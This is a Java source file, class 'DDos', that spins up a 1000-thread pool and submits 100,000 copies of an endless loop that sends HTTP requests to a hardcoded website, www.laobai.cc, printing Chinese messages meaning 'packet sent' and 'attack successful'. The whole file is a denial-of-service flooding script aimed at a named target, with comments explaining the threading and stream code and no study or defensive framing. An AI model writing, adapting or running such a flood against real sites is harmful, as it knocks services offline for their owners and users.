package mima;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDos {
	 public static void main(String[] args) {
	        ExecutorService es = Executors.newFixedThreadPool(1000);
	        //创建一个可重用固定线程数的线程池，以共享的无界队列方式来运行这些线程。
	        Mythread mythread = new Mythread();
	        Thread thread = new Thread(mythread);
	        for (int i = 0; i < 100000; i++) {
	            es.execute(thread);
	        }
	    }
	}

	class Mythread implements Runnable {//多线程，run()方法的方法体是线程执行体。
	    public void run() {
	        while (true) {
	            try {
	                URL url = new URL("https://www.laobai.cc/");
	                
	                URLConnection conn = url.openConnection();
	                //每个线程预建一个openConnection（）；以后线程启动都使用openConnection()得到的同一对象
	                System.out.println("发包成功！");
	                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
	                //BufferedInputStream时，会创建一个内部缓冲区数组。在读取流中的字节时，可根据需要从包含的输入流再次填充该内部缓冲区，一次填充多个字节。
	                byte[] bytes = new byte[1024];//定义了一个byte类型的数组。
	                int len = -1;
	                StringBuffer sb = new StringBuffer();

	                if (bis != null) {
	                    if ((len = bis.read()) != -1) {//通过read()方法获取到缓存的内容
	                        sb.append(new String(bytes, 0, len));// 以追加的方式打开文件
	                        System.out.println("攻击成功！");
	                        bis.close();
	                    }
	                }
	            } catch (MalformedURLException e) {
	                // TODO Auto-generated catch block
	                e.printStackTrace();
	            } catch (IOException e) {
	                // TODO Auto-generated catch block
	                e.printStackTrace();
	            }

	        }
	    }
	}